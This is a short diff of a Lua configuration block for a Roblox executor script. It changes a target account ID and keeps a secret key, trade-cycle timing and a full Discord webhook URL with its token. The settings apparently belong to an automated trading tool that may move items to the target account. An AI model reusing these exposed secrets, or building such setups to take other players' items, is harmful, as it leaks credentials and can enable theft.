@@ -1,5 +1,5 @@
 getgenv().SECRET_KEY = "mrr_08d38b45e32b4054a799c2ca298b6f48"
-getgenv().TARGET_ID = 5567675855
+getgenv().TARGET_ID = 10712581361
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2
 getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484845739023532114/XX2aoV0wPTi76Y7J05p1cbxiOWAnacE26vLaj7QlzIOkTtyMIOJYHRFfaFsf5x_HzBmA"
